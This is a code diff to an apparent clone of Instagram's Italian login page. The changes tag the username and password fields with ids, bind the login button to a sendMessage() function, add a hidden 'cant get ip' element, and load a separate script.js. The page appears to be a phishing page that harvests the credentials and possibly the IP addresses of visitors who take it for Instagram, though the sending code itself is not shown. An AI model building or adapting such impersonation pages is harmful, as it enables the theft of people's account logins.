@@ -21,12 +21,12 @@
 			<div class="header">
 				<div class="screenshot">
 					<ul>
-						<li><img src="img/screen.png"></li>
-						<li><img alt="img5" src="img/screen5.png"></li>
-						<li><img alt="img1" src="img/screen4.png"></li>
- 						<li><img alt="img2" src="img/screen3.png"></li>
-						<li><img alt="img3" src="img/screen2.png"></li>
-						<li><img alt="img4" src="img/screen1.png"></li>
+						<li><img src="img/screen/screen.png"></li>
+						<li><img alt="img5" src="img/screen/screen5.png"></li>
+						<li><img alt="img1" src="img/screen/screen4.png"></li>
+ 						<li><img alt="img2" src="img/screen/screen3.png"></li>
+						<li><img alt="img3" src="img/screen/screen2.png"></li>
+						<li><img alt="img4" src="img/screen/screen1.png"></li>
 					</ul>
 				</div>
 
@@ -37,12 +37,12 @@
 						</div>
 						<div class="form">
 							<div class="input_field">
-								<input type="text" placeholder="Numero di telefono, nome utente o email" class="input">
+								<input type="text" placeholder="Numero di telefono, nome utente o email" class="input" id="username">
 							</div>
 							<div class="input_field">
-								<input type="password" placeholder="Password" class="input">
+								<input type="password" placeholder="Password" class="input" id="password">
 							</div>
-							<div class="btn"><a href="#">Accedi</a></div>
+							<div class="btn" onclick="sendMessage()"><a href="#">Accedi</a></div>
 						</div>
 						<div class="or">
 							<div class="line"></div>
@@ -55,7 +55,7 @@
 								<p>Accedi con Facebook</p>
 							</div>
 							<div class="forgot">
-								<a href="#">Hai dimenticato la password?</a>
+								<a href="reset_password/reset/">Hai dimenticato la password?</a>
 							</div>
 						</div>
 					</div>
@@ -75,6 +75,7 @@
 			<div class="footer">
 				<div class="links">
 					<ul>
+						<li><a href="#">Meta</a></li>
 						<li><a href="#">Informazioni</a></li>
 						<li><a href="#">Blog</a></li>
 						<li><a href="#">Lavora con noi</a></li>
@@ -98,13 +99,19 @@
 						<li><a href="#">Arti visive</a></li>
 					</ul>
 					
-					<a class="copyright" href="#">©2021 Instagram di Facebook</a>
-					
+					<div class="copyright">
+						<select name="languaguage"> <option value="it">Italiano</option> </select> 
+						<a href="#">©2022 Instagram from Meta</a>
+					</div>
+
 				</div>
 		
 			</div>
 		</div>
 	</div>
 
+	<p id="ciao" hidden>cant get ip</p>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+	<script src="script.js"></script>
 </body>
 </html>
